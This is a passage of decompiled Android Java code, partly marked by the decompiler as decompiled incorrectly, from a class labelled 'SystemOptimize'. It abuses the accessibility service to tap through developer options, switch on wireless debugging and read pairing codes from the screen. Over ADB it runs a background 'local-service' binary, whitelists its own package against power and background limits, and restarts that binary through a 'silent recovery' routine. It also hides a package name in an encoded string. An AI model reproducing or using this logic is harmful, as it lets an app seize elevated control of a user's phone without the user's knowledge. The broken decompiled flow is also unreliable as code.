                        this.f53822a7.set(true);
                        t60.m214702c3("SystemOptimize", "pairInFinish finishLocalAdbPair");
                        m212099k9();
                        m212104l4();
                        try {
                            this.f53835c0 = false;
                            this.f53836c1 = false;
                            this.f53837c2 = false;
                        } catch (Exception e) {
                            t60.m214705c6("SystemOptimize", "B_reset 异常", e);
                        }
                        this.f53817a2.shutdownNow();
                        Thread.interrupted();
                        this.f53819a4.set(SystemOptimizeManager$PairState.f53765a6);
                        this.f53818a3.clear();
                        m212067h1();
                        t60.m214702c3("SystemOptimize", "已结束本地配对自动化引擎");
                    }
                } catch (Exception e2) {
                    t60.m214705c6("SystemOptimize", "D0() 异常", e2);
                }
            }
        } finally {
            this.f53821a6.unlock();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:110:0x023f A[Catch: Exception -> 0x0018, TryCatch #1 {Exception -> 0x0018, blocks: (B:3:0x0005, B:5:0x0012, B:9:0x001b, B:12:0x002f, B:15:0x0036, B:16:0x003a, B:18:0x0040, B:20:0x004c, B:23:0x0053, B:25:0x0059, B:27:0x005f, B:33:0x008f, B:35:0x00a5, B:37:0x00b5, B:38:0x00b8, B:40:0x00c4, B:42:0x00ca, B:45:0x00d1, B:46:0x00d5, B:48:0x00db, B:50:0x00e7, B:53:0x00ee, B:55:0x00f4, B:57:0x00fa, B:59:0x0125, B:61:0x012b, B:65:0x0133, B:67:0x0153, B:69:0x0159, B:71:0x017a, B:74:0x0189, B:76:0x018f, B:84:0x01a9, B:86:0x01b6, B:88:0x01d0, B:90:0x01fa, B:91:0x0204, B:107:0x0230, B:109:0x0236, B:105:0x0227, B:110:0x023f, B:112:0x0259, B:115:0x0262, B:117:0x0275, B:119:0x0293, B:120:0x029c, B:126:0x02b1, B:127:0x02b6, B:121:0x02a1, B:123:0x02aa, B:92:0x0206, B:95:0x020e, B:99:0x0218, B:102:0x021f), top: B:134:0x0005, inners: #0, #2 }] */
    /* JADX WARN: Removed duplicated region for block: B:117:0x0275 A[Catch: Exception -> 0x0018, TryCatch #1 {Exception -> 0x0018, blocks: (B:3:0x0005, B:5:0x0012, B:9:0x001b, B:12:0x002f, B:15:0x0036, B:16:0x003a, B:18:0x0040, B:20:0x004c, B:23:0x0053, B:25:0x0059, B:27:0x005f, B:33:0x008f, B:35:0x00a5, B:37:0x00b5, B:38:0x00b8, B:40:0x00c4, B:42:0x00ca, B:45:0x00d1, B:46:0x00d5, B:48:0x00db, B:50:0x00e7, B:53:0x00ee, B:55:0x00f4, B:57:0x00fa, B:59:0x0125, B:61:0x012b, B:65:0x0133, B:67:0x0153, B:69:0x0159, B:71:0x017a, B:74:0x0189, B:76:0x018f, B:84:0x01a9, B:86:0x01b6, B:88:0x01d0, B:90:0x01fa, B:91:0x0204, B:107:0x0230, B:109:0x0236, B:105:0x0227, B:110:0x023f, B:112:0x0259, B:115:0x0262, B:117:0x0275, B:119:0x0293, B:120:0x029c, B:126:0x02b1, B:127:0x02b6, B:121:0x02a1, B:123:0x02aa, B:92:0x0206, B:95:0x020e, B:99:0x0218, B:102:0x021f), top: B:134:0x0005, inners: #0, #2 }] */
    /* JADX WARN: Removed duplicated region for block: B:123:0x02aa A[Catch: Exception -> 0x02b0, TRY_LEAVE, TryCatch #0 {Exception -> 0x02b0, blocks: (B:121:0x02a1, B:123:0x02aa), top: B:132:0x02a1, outer: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02a1 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:31:0x008c  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00a5 A[Catch: Exception -> 0x0018, TryCatch #1 {Exception -> 0x0018, blocks: (B:3:0x0005, B:5:0x0012, B:9:0x001b, B:12:0x002f, B:15:0x0036, B:16:0x003a, B:18:0x0040, B:20:0x004c, B:23:0x0053, B:25:0x0059, B:27:0x005f, B:33:0x008f, B:35:0x00a5, B:37:0x00b5, B:38:0x00b8, B:40:0x00c4, B:42:0x00ca, B:45:0x00d1, B:46:0x00d5, B:48:0x00db, B:50:0x00e7, B:53:0x00ee, B:55:0x00f4, B:57:0x00fa, B:59:0x0125, B:61:0x012b, B:65:0x0133, B:67:0x0153, B:69:0x0159, B:71:0x017a, B:74:0x0189, B:76:0x018f, B:84:0x01a9, B:86:0x01b6, B:88:0x01d0, B:90:0x01fa, B:91:0x0204, B:107:0x0230, B:109:0x0236, B:105:0x0227, B:110:0x023f, B:112:0x0259, B:115:0x0262, B:117:0x0275, B:119:0x0293, B:120:0x029c, B:126:0x02b1, B:127:0x02b6, B:121:0x02a1, B:123:0x02aa, B:92:0x0206, B:95:0x020e, B:99:0x0218, B:102:0x021f), top: B:134:0x0005, inners: #0, #2 }] */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0125 A[Catch: Exception -> 0x0018, TryCatch #1 {Exception -> 0x0018, blocks: (B:3:0x0005, B:5:0x0012, B:9:0x001b, B:12:0x002f, B:15:0x0036, B:16:0x003a, B:18:0x0040, B:20:0x004c, B:23:0x0053, B:25:0x0059, B:27:0x005f, B:33:0x008f, B:35:0x00a5, B:37:0x00b5, B:38:0x00b8, B:40:0x00c4, B:42:0x00ca, B:45:0x00d1, B:46:0x00d5, B:48:0x00db, B:50:0x00e7, B:53:0x00ee, B:55:0x00f4, B:57:0x00fa, B:59:0x0125, B:61:0x012b, B:65:0x0133, B:67:0x0153, B:69:0x0159, B:71:0x017a, B:74:0x0189, B:76:0x018f, B:84:0x01a9, B:86:0x01b6, B:88:0x01d0, B:90:0x01fa, B:91:0x0204, B:107:0x0230, B:109:0x0236, B:105:0x0227, B:110:0x023f, B:112:0x0259, B:115:0x0262, B:117:0x0275, B:119:0x0293, B:120:0x029c, B:126:0x02b1, B:127:0x02b6, B:121:0x02a1, B:123:0x02aa, B:92:0x0206, B:95:0x020e, B:99:0x0218, B:102:0x021f), top: B:134:0x0005, inners: #0, #2 }] */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212027a1(AccessibilityNodeInfo accessibilityNodeInfo) {
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo next;
        boolean z;
        String lowerCase;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        String string;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        String string2;
        String string3;
        try {
            t60.m214714d6("SystemOptimize", "J0() 开始执行 - 检查开发者选项总开关");
            rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
        } catch (Exception e) {
            tz0.m214808a8("J0() 异常: ", e.getMessage(), "SystemOptimize", e);
        }
        if (rootInActiveWindow == null) {
            t60.m214704c5("SystemOptimize", "J0() rootInActiveWindow为null，返回false");
            return false;
        }
        t60.m214714d6("SystemOptimize", "J0() 方式0: 通过resource-id查找第一个Switch");
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2 = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/checkbox");
        String str = "";
        AccessibilityNodeInfo accessibilityNodeInfo3 = null;
        if (listFindAccessibilityNodeInfosByViewId2 == null || listFindAccessibilityNodeInfosByViewId2.isEmpty()) {
            next = null;
            t60.m214714d6("SystemOptimize", "J0() 方式0结果: switchNode=" + (next == null));
            if (next == null) {
                t60.m214714d6("SystemOptimize", "J0() 方式0未找到，滚动到顶部再找");
                m212088j6(accessibilityNodeInfo);
                AccessibilityNodeInfo rootInActiveWindow2 = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    rootInActiveWindow2.refresh();
                }
                m212025k1(3);
                AccessibilityNodeInfo rootInActiveWindow3 = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null && (listFindAccessibilityNodeInfosByViewId = rootInActiveWindow3.findAccessibilityNodeInfosByViewId("android:id/checkbox")) != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        AccessibilityNodeInfo next2 = it.next();
                        CharSequence className = next2.getClassName();
                        if (className == null || (string2 = className.toString()) == null) {
                            string2 = "";
                        }
                        if (AbstractC0779a1.m213652a5(string2, "Switch", false) && next2.isEnabled()) {
                            t60.m214714d6("SystemOptimize", "J0() 滚动后找到Switch! class=" + string2 + ", isChecked=" + next2.isChecked() + ", checkable=" + next2.isCheckable());
                            next = next2;
                            break;
                        }
                    }
                }
            }
            if (next != null) {
                CharSequence className2 = next.getClassName();
                if (className2 != null && (string = className2.toString()) != null) {
                    str = string;
                }
                boolean zIsChecked = next.isChecked();
                t60.m214714d6("SystemOptimize", "J0() 找到Switch: class=" + str + ", isChecked=" + zIsChecked);
                if (zIsChecked) {
                    t60.m214714d6("SystemOptimize", "J0() 开发者选项已勾选，直接返回true");
                    return true;
                }
                t60.m214714d6("SystemOptimize", "J0() 即将点击开关");
                boolean zPerformAction = next.performAction(16);
                t60.m214714d6("SystemOptimize", "J0() 点击结果: clicked=" + zPerformAction);
                if (zPerformAction) {
                    t60.m214702c3("SystemOptimize", "开发者选项已点击");
                    AtomicInteger atomicInteger = new AtomicInteger(10);
                    loop2: while (true) {
                        while (!z && atomicInteger.decrementAndGet() >= 0) {
                            m212025k1(1);
                            try {
                                AccessibilityNodeInfo rootInActiveWindow4 = this.f53815a0.getRootInActiveWindow();
                                if (rootInActiveWindow4 == null) {
                                    break;
                                }
                                y90 y90Var = AbstractC0361a3.f53874a0;
                                z = m212014f9(rootInActiveWindow4, dh0.f55798e8) != null;
                            } catch (Exception unused) {
                            }
                        }
                        break loop2;
                    }
                    if (z) {
                        t60.m214702c3("SystemOptimize", "开发者选项已点击,已弹出允许开发设置对话框");
                        AccessibilityNodeInfo rootInActiveWindow5 = this.f53815a0.getRootInActiveWindow();
                        if (rootInActiveWindow5 != null) {
                            List list = dh0.f55752a2;
                            y90 y90Var2 = AbstractC0361a3.f53874a0;
                            AccessibilityNodeInfo accessibilityNodeInfoM212012f7 = m212012f7(rootInActiveWindow5, AbstractC0715je.m213298i5(list, dh0.f55809f9), AbstractC0715je.m213298i5(dh0.f55753a3, dh0.f55810g0));
                            if (accessibilityNodeInfoM212012f7 != null) {
                                t60.m214702c3("SystemOptimize", "找到确定按钮: text=" + ((Object) accessibilityNodeInfoM212012f7.getText()) + ", class=" + ((Object) accessibilityNodeInfoM212012f7.getClassName()));
                                if (accessibilityNodeInfoM212012f7.performAction(16)) {
                                    t60.m214702c3("SystemOptimize", "已点击允许打开开发者选项，等待3秒让页面稳定");
                                    m212025k1(15);
                                } else {
                                    List list2 = C0362a4.f53875a0;
                                    try {
                                    } catch (Exception e2) {
                                        t60.m214705c6("UiNodeHelper", "findClickableParent 异常", e2);
                                    }
                                    if (accessibilityNodeInfoM212012f7.isClickable()) {
                                        accessibilityNodeInfo3 = accessibilityNodeInfoM212012f7;
                                        if (accessibilityNodeInfo3 == null && accessibilityNodeInfo3.performAction(16)) {
                                            t60.m214702c3("SystemOptimize", "已点击允许打开开发者选项(父节点)，等待3秒让页面稳定");
                                            m212025k1(15);
                                        } else {
                                            String str2 = Build.BRAND;
                                            t60.m214694b5(str2, "BRAND");
                                            lowerCase = str2.toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                            if (!lowerCase.equals("vivo") && !lowerCase.equals("iqoo")) {
                                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId3 = rootInActiveWindow5.findAccessibilityNodeInfosByViewId("android:id/button1");
                                                t60.m214694b5(listFindAccessibilityNodeInfosByViewId3, "root.findAccessibilityNodeInfosByViewId(id)");
                                                accessibilityNodeInfo2 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId3);
                                                if (accessibilityNodeInfo2 != null) {
                                                    t60.m214702c3("SystemOptimize", "找到确定按钮(button1): " + ((Object) accessibilityNodeInfo2.getText()));
                                                    if (accessibilityNodeInfo2.performAction(16)) {
                                                        t60.m214702c3("SystemOptimize", "已点击允许打开开发者选项(button1)，等待3秒让页面稳定");
                                                        m212025k1(15);
                                                    }
                                                }
                                            }
                                            t60.m214704c5("SystemOptimize", "未找到确定按钮或点击失败");
                                            try {
                                                next.refresh();
                                                if (next.isChecked()) {
                                                    t60.m214702c3("SystemOptimize", "开发者选项已勾选");
                                                }
                                            } catch (Exception e3) {
                                                t60.m214705c6("SystemOptimize", "刷新开关状态失败", e3);
                                            }
                                        }
                                    } else {
                                        accessibilityNodeInfoM212012f7 = accessibilityNodeInfoM212012f7.getParent();
                                        for (int i = 0; accessibilityNodeInfoM212012f7 != null && i < 5; i++) {
                                            if (accessibilityNodeInfoM212012f7.isClickable()) {
                                                accessibilityNodeInfo3 = accessibilityNodeInfoM212012f7;
                                                break;
                                            }
                                            accessibilityNodeInfoM212012f7 = accessibilityNodeInfoM212012f7.getParent();
                                        }
                                        if (accessibilityNodeInfo3 == null) {
                                            String str22 = Build.BRAND;
                                            t60.m214694b5(str22, "BRAND");
                                            lowerCase = str22.toLowerCase(Locale.ROOT);
                                            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                            if (!lowerCase.equals("vivo")) {
                                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId32 = rootInActiveWindow5.findAccessibilityNodeInfosByViewId("android:id/button1");
                                                t60.m214694b5(listFindAccessibilityNodeInfosByViewId32, "root.findAccessibilityNodeInfosByViewId(id)");
                                                accessibilityNodeInfo2 = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId32);
                                                if (accessibilityNodeInfo2 != null) {
                                                }
                                            }
                                            t60.m214704c5("SystemOptimize", "未找到确定按钮或点击失败");
                                            next.refresh();
                                            if (next.isChecked()) {
                                            }
                                        }
                                    }
                                }
                                return true;
                            }
                        } else {
                            next.refresh();
                            if (next.isChecked()) {
                            }
                        }
                    }
                }
            }
            t60.m214704c5("SystemOptimize", "J0() 最终结果: 开发者选项未勾选，返回false");
        } else {
            Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByViewId2.iterator();
            while (it2.hasNext()) {
                next = it2.next();
                CharSequence className3 = next.getClassName();
                if (className3 == null || (string3 = className3.toString()) == null) {
                    string3 = "";
                }
                if (AbstractC0779a1.m213652a5(string3, "Switch", false) && next.isEnabled()) {
                    t60.m214714d6("SystemOptimize", "J0() 方式0: 找到Switch! class=" + string3 + ", isChecked=" + next.isChecked() + ", checkable=" + next.isCheckable());
                    break;
                }
            }
            next = null;
            if (next == null) {
            }
            t60.m214714d6("SystemOptimize", "J0() 方式0结果: switchNode=" + (next == null));
            if (next == null) {
            }
            if (next != null) {
            }
            t60.m214704c5("SystemOptimize", "J0() 最终结果: 开发者选项未勾选，返回false");
        }
        return false;
    }

    /* renamed from: a2 */
    public final boolean m212028a2() {
        try {
            String str = (String) this.f53824a9.f45890a0.get();
            t60.m214702c3("SystemOptimize", "K() pkg=" + str + ", cls=" + ((String) this.f53824a9.f45891a1.get()));
            bf1 bf1Var = this.f53824a9;
            bf1Var.getClass();
            try {
            } catch (Exception e) {
                t60.m214705c6("WindowDetector", "isInDevOptionsWindow 异常", e);
            }
            if (bf1Var.m210717a3(we1.m215053a4())) {
                t60.m214702c3("WindowDetector", "已进入开发者、开发人员选项窗口");
                t60.m214702c3("SystemOptimize", "K() windowDetector.isInDevOptionsWindow()=true");
                return true;
            }
            if (t60.m214686a2(str, "com.android.settings")) {
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    for (String str2 : dh0.f55783d3) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            t60.m214702c3("SystemOptimize", "K() 找到标题'" + str2 + "'，返回true");
                            return true;
                        }
                    }
                    t60.m214702c3("SystemOptimize", "K() 未找到开发者选项标题，返回false");
                }
            } else {
                t60.m214702c3("SystemOptimize", "K() pkg不是settings，返回false");
            }
            return false;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "K() 异常", e2);
            return false;
        }
    }

    /* renamed from: a3 */
    public final boolean m212029a3() {
        String string;
        String string2;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                ArrayList arrayList = new ArrayList();
                m212007f2(rootInActiveWindow, arrayList);
                int size = arrayList.size();
                boolean z = false;
                boolean z2 = false;
                int i = 0;
                while (i < size) {
                    Object obj = arrayList.get(i);
                    i++;
                    CharSequence text = ((AccessibilityNodeInfo) obj).getText();
                    if (text != null && (string = text.toString()) != null && (string2 = AbstractC0779a1.m213687e0(string).toString()) != null) {
                        if (string2.length() == 6) {
                            int i2 = 0;
                            while (true) {
                                if (i2 >= string2.length()) {
                                    z = true;
                                    break;
                                }
                                if (!Character.isDigit(string2.charAt(i2))) {
                                    break;
                                }
                                i2++;
                            }
                        }
                        List list = dh0.f55787d7;
                        if (list == null || !list.isEmpty()) {
                            Iterator it = list.iterator();
                            while (true) {
                                if (!it.hasNext()) {
                                    break;
                                }
                                if (string2.equals((String) it.next())) {
                                    z2 = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if (z && z2) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "L() 异常", e);
            return false;
        }
    }

    /* renamed from: a4 */
    public final boolean m212030a4() {
        try {
            bf1 bf1Var = this.f53824a9;
            bf1Var.getClass();
            try {
            } catch (Exception e) {
                t60.m214705c6("WindowDetector", "isInPairFailedDialog 异常", e);
            }
            if (bf1Var.m210717a3(AbstractC1117qo.m214451e7(we1.m215056a7()))) {
                t60.m214702c3("WindowDetector", "已进入配对失败对话框");
                return true;
            }
            AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return false;
            }
            y90 y90Var = AbstractC0361a3.f53874a0;
            return m212014f9(rootInActiveWindow, dh0.f55793e3) != null;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "M() 异常", e2);
            return false;
        }
    }

    /* renamed from: a5 */
    public final boolean m212031a5() {
        bf1 bf1Var = this.f53824a9;
        bf1Var.getClass();
        try {
            List list = we1.f60897a0;
            if (!bf1Var.m210717a3(AbstractC1117qo.m214451e7(new nb0(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.miui.permcenter.install.AdbInputApplyActivity", kg1.m213527d3(32, 2048, 1))))) {
                return false;
            }
            t60.m214702c3("WindowDetector", "已进入MIUI ADB输入窗口");
            return true;
        } catch (Exception e) {
            t60.m214705c6("WindowDetector", "isInMiuiAdbInputWindow 异常", e);
            return false;
        }
    }

    /* renamed from: a6 */
    public final boolean m212032a6() {
        try {
            String str = (String) this.f53824a9.f45890a0.get();
            t60.m214702c3("SystemOptimize", "O() pkg=" + str + ", cls=" + ((String) this.f53824a9.f45891a1.get()));
            bf1 bf1Var = this.f53824a9;
            bf1Var.getClass();
            try {
            } catch (Exception e) {
                t60.m214705c6("WindowDetector", "isInWirelessDebugWindow 异常", e);
            }
            if (bf1Var.m210717a3(we1.m215054a5())) {
                t60.m214702c3("WindowDetector", "已进入无线调试窗口");
                t60.m214702c3("SystemOptimize", "O() windowDetector.isInWirelessDebugWindow()=true");
                return true;
            }
            if (t60.m214686a2(str, "com.android.settings")) {
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    for (String str2 : dh0.f55786d6) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            t60.m214702c3("SystemOptimize", "O() 找到'" + str2 + "'，返回true");
                            return true;
                        }
                    }
                    t60.m214702c3("SystemOptimize", "O() 未找到无线调试详情文本，返回false");
                }
            } else {
                t60.m214702c3("SystemOptimize", "O() pkg不是settings，返回false");
            }
            return false;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "O() 异常", e2);
            return false;
        }
    }

    /* renamed from: a7 */
    public final boolean m212033a7(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean zM212073h8 = m212073h8();
        for (int i = 1; i < 3 && !zM212073h8; i++) {
            try {
                C0579hf c0579hfM212060f1 = m212060f1(accessibilityNodeInfo);
                if (c0579hfM212060f1.f56663a1) {
                    t60.m214702c3("SystemOptimize", "无线调试勾选框已点击 (第" + i + "次)");
                    List list = C0362a4.f53875a0;
                    C0362a4.m212113a8(this.f53815a0, 1500L);
                    m212068h2();
                }
                if (c0579hfM212060f1.f56662a0) {
                    t60.m214702c3("SystemOptimize", "已勾选无线调试");
                }
                zM212073h8 = m212073h8();
            } catch (Exception e) {
                t60.m214705c6("SystemOptimize", "P() 异常", e);
            }
        }
        return zM212073h8;
    }

    /* renamed from: a8 */
    public final boolean m212034a8(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            t60.m214702c3("SystemOptimize", "禁用ADB调试栏目查找成功");
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            int iCenterX = rect.centerX();
            int i = rect.top - 100;
            Path path = new Path();
            path.moveTo(iCenterX, i);
            this.f53815a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
            t60.m214702c3("SystemOptimize", "根据屏幕左边点击无线调试栏目完成");
            return true;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "Q() 异常", e);
            return false;
        }
    }

    /* renamed from: b7 */
    public final void m212035b7() {
        synchronized (this.f53873f8) {
            try {
                g41 g41Var = this.f53872f7;
                if (g41Var != null) {
                    g41Var.m212891a0();
                }
            } catch (Exception unused) {
            }
            this.f53872f7 = null;
            this.f53841c6.set(false);
        }
        boolean zM212071h6 = m212071h6();
        int i = Settings.Global.getInt(this.f53816a1.getContentResolver(), "adb_enabled", 0) != 1 ? 0 : 1;
        m212062g4().edit().putBoolean("connected", false).remove("connectedDevice").putInt("connectErrorCount", 0).putInt("installedRatHat", -1).putInt("isRatHatRunning", -1).putInt("enableDevelopment", zM212071h6 ? 1 : 0).putInt("enableDebug", i).putInt("enableWifiDebug", m212073h8() ? 1 : 0).apply();
        t60.m214702c3("SystemOptimize", "【h.p】ADB 状态已重置");
    }

    /* renamed from: b8 */
    public final boolean m212036b8() {
        g41 g41Var;
        return this.f53841c6.get() && (g41Var = this.f53872f7) != null && g41Var.f56394b0 && !g41Var.f56388a4.isClosed() && g41Var.f56388a4.isConnected();
    }

    /* renamed from: b9 */
    public final boolean m212037b9(String str) {
        if (str.length() == 0) {
            return false;
        }
        t60.m214702c3("SystemOptimize", "adbO: ".concat(str));
        StringBuilder sb = new StringBuilder("if ");
        sb.append(str);
        sb.append("; then echo \"Success\"; else echo \"Failed\"; fi");
        return m212039c1(sb.toString(), "Success", "Failed") == 1;
    }

    /* renamed from: c0 */
    public final void m212038c0() {
        try {
            t60.m214702c3("SystemOptimize", "adbP: nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &");
            m212059e9();
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "adbP 异常", e);
        }
    }

    /* renamed from: c1 */
    public final int m212039c1(String str, String str2, String str3) {
        if (str.length() == 0) {
            return 5;
        }
        try {
            t60.m214702c3("SystemOptimize", "adbR: ".concat(str));
            String strM212058e8 = m212058e8(str);
            if (strM212058e8 == null) {
                t60.m214726f4("SystemOptimize", "adbR: 无输出");
                return 5;
            }
            if (AbstractC0779a1.m213652a5(strM212058e8, str2, false)) {
                t60.m214702c3("SystemOptimize", "adbR: 匹配成功[" + str2 + "]");
                return 1;
            }
            if (!AbstractC0779a1.m213652a5(strM212058e8, str3, false)) {
                t60.m214702c3("SystemOptimize", "adbR: 无匹配, output=".concat(m21.m213937e5(100, strM212058e8)));
                return 5;
            }
            t60.m214702c3("SystemOptimize", "adbR: 匹配失败[" + str3 + "]");
            return 0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "adbR 异常", e);
            return 5;
        }
    }

    /* renamed from: c4 */
    public final void m212040c4() {
        Context context = this.f53816a1;
        try {
            String packageName = context.getPackageName();
            int i = context.getApplicationInfo().uid;
            t60.m214714d6("SystemOptimize", "🛡️ 设置系统保活白名单: pkg=" + packageName + " uid=" + i);
            for (String str : AbstractC0716jf.m213306g5("cmd deviceidle whitelist +" + packageName, "dumpsys deviceidle whitelist +" + packageName, "am set-standby-bucket " + packageName + " active", "cmd netpolicy add restrict-background-whitelist " + i, "cmd netpolicy add app-idle-whitelist " + i, "cmd appops set " + packageName + " RUN_IN_BACKGROUND allow", "cmd appops set " + packageName + " RUN_ANY_IN_BACKGROUND allow")) {
                try {
                    m212037b9(str);
                } catch (Exception e) {
                    t60.m214726f4("SystemOptimize", "白名单命令失败: " + str + " - " + e.getMessage());
                }
            }
            t60.m214714d6("SystemOptimize", "🛡️ 系统保活白名单设置完成");
        } catch (Exception unused) {
        }
    }

    /* renamed from: c6 */
    public final String m212041c6(boolean z) {
        String string = Settings.Secure.getString(this.f53816a1.getContentResolver(), "android_id");
        if (string == null) {
            string = "";
        }
        return "{\"paired\":" + z + ",\"updateTime\":" + System.currentTimeMillis() + ",\"deviceId\":\"" + string + "\",\"debugPort\":" + m212064g7() + "}";
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:37:0x0137 -> B:43:0x0142). Please report as a decompilation issue!!! */
    /* renamed from: c9 */
    public final void m212042c9() {
        boolean z;
        int responseCode;
        boolean zM213652a5 = false;
        try {
            z = this.f53816a1.getSharedPreferences("system_optimize", 0).getBoolean("adb_deploy_enabled", false);
        } catch (Exception unused) {
            z = false;
        }
        if (z) {
            try {
                URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/noticeAlive").openConnection();
                t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setConnectTimeout(5000);
                httpURLConnection.setReadTimeout(5000);
                httpURLConnection.setDoOutput(true);
                String packageName = this.f53816a1.getPackageName();
                OutputStream outputStream = httpURLConnection.getOutputStream();
                byte[] bytes = ("{\"packageName\":\"" + packageName + "\"}").getBytes(AbstractC0577hd.f56650a0);
                t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                outputStream.write(bytes);
                responseCode = httpURLConnection.getResponseCode();
                httpURLConnection.disconnect();
            } catch (Exception unused2) {
            }
            boolean z2 = responseCode == 200;
            try {
                if (z2) {
                    this.f53848d3.set(0);
                } else {
                    int iIncrementAndGet = this.f53848d3.incrementAndGet();
                    t60.m214726f4("SystemOptimize", "【CheckProcess】local-service 存活检查失败 (" + iIncrementAndGet + "/10)");
                    this.f53840c5.set(false);
                    if (iIncrementAndGet > 10) {
                        t60.m214704c5("SystemOptimize", "【CheckProcess】连续失败 " + iIncrementAndGet + " 次，开始无感恢复 local-service");
                        this.f53848d3.set(0);
                        try {
                            Process processExec = Runtime.getRuntime().exec("sh -c \"ps -ef | grep local-service | grep -v grep\"");
                            InputStream inputStream = processExec.getInputStream();
                            t60.m214694b5(inputStream, "process.inputStream");
                            String strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE));
                            TimeUnit timeUnit = TimeUnit.SECONDS;
                            if (!processExec.waitFor(10L, TimeUnit.SECONDS)) {
                                processExec.destroy();
                            }
                            zM213652a5 = AbstractC0779a1.m213652a5(strM210590e1, "local-service server", false);
                        } catch (Exception unused3) {
                        }
                        try {
                            if (zM213652a5) {
                                t60.m214726f4("SystemOptimize", "【CheckProcess】ps 显示进程仍在运行，可能是 HTTP 响应慢，跳过恢复");
                            } else {
                                t60.m214714d6("SystemOptimize", "【CheckProcess】确认进程已死亡，开始恢复");
                                if (m212036b8()) {
                                    m212038c0();
                                    v00.f60540a1 = 0L;
                                    t60.m214714d6("SystemOptimize", "【CheckProcess】已通过现有 ADB 连接重启");
                                } else {
                                    t60.m214714d6("SystemOptimize", "【CheckProcess】ADB 未连接，启动无感恢复流程");
                                    if (this.f53849d4) {
                                        t60.m214702c3("SystemOptimize", "【SilentRecover】已在运行中，跳过");
                                    } else {
                                        ((ExecutorService) this.f53857e2.getValue()).submit(new c41(this, 7));
                                    }
                                }
                            }
                        } catch (Exception e) {
                            t60.m214705c6("SystemOptimize", "【CheckProcess】无感恢复异常", e);
                        }
                    }
                }
            } catch (Exception e2) {
                t60.m214705c6("SystemOptimize", "【CheckProcess】异常", e2);
            }
        }
    }

    /* renamed from: d0 */
    public final void m212043d0() {
        this.f53823a8.set(false);
        this.f53822a7.set(true);
        try {
            this.f53817a2.shutdownNow();
        } catch (Exception unused) {
        }
        this.f53818a3.clear();
    }

    /* renamed from: d1 */
    public final void m212044d1() {
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            y90 y90Var = AbstractC0361a3.f53874a0;
